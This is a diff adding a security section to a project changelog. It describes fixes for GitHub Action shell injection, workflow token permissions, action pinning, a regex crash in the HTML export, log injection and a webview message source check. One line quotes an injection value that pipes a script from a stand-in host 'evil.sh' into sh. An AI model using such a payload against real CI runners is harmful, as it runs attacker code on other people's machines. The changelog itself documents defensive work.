@@ -7,6 +7,54 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ---
 
+## [0.5.79] — 2026-08-02
+
+### Security
+
+- **The shipped GitHub Action could run attacker-supplied shell
+  (`actions/code-injection`, 7 alerts).** `.github/actions/epochix/action.yml`
+  interpolated `${{ inputs.log-file }}`, `${{ inputs.task }}` and step outputs
+  directly into `run:` and `script:` bodies. GitHub substitutes an expression
+  into the script *before* bash or Node parses it, so a log-file value of
+  `x"; curl evil.sh | sh; "` executed in the caller's runner — and callers
+  routinely wire these inputs to PR titles and branch names. Every value now
+  reaches the script through `env:`, where it is data rather than source.
+
+- **Workflow tokens were write-capable by default
+  (`actions/missing-workflow-permissions`, 19 alerts).** All six workflows now
+  declare `permissions: contents: read` at the top level. The four release jobs
+  that genuinely need to write already declared it themselves, and none of them
+  check out the repo.
+
+- **Every action was referenced by a movable tag (`actions/unpinned-tag`,
+  13 alerts).** A tag can be repointed at different code by whoever owns it.
+  All 67 `uses:` are pinned to a 40-character commit SHA with the version kept
+  as a trailing comment. Dependabot already watches this ecosystem and updates
+  SHA pins in place.
+
+- **A run name containing a regex backreference crashed the HTML export.**
+  `re.sub` expands backslash escapes in a *string* replacement, so a run named
+  `run` or `run\g<0>` raised `re.error` and returned a 500. Run names come
+  from log files. The replacement is a function now, which is inserted
+  literally. The exporter's hand-rolled escaper was also replaced with
+  `html.escape` — it was correct, but there is no reason to keep re-deriving
+  this after the frontend's eleven copies got it wrong.
+
+- **Untrusted values reached log lines unescaped (`py/log-injection`,
+  3 alerts).** A run id containing a newline forged log entries, and one
+  containing ANSI escapes could colour the forgery to match. `log_safe` in
+  `server/logsafe.py` now collapses control characters to `?` — marking the
+  tampering rather than hiding it — at all three sinks in `ws.py` and `sse.py`.
+
+- **The webview bridge accepted messages from any frame
+  (`js/missing-origin-check`).** `vscode-bridge.js` now rejects any sender that
+  is neither the embedding page nor the extension host. Deliberately a source
+  check rather than an origin check: a webview's origin is an opaque
+  `vscode-webview://<uuid>` that changes per session, so an origin allow-list
+  would be either wrong or `*`.
+
+---
+
 ## [0.5.78] — 2026-08-02
 
 ### Security
